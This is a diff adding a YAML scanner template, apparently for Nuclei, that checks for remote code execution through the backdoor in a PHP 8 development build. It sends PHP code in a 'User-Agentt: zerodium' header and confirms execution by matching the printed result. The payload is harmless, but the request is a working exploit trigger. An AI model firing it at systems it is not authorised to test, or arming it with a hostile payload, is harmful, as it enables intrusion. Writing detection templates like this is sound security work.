@@ -1,0 +1,27 @@
+id: PHP8-dev-RCE
+
+info:
+  name: PHP8-dev-RCE
+  author: shifacyclewala & hackergautam
+  severity: critical
+  tags: rce,php
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 43
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agentt: zerodiumvar_dump(1337*1337);
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "int(1787569)"
+        part: body
+        condition: and
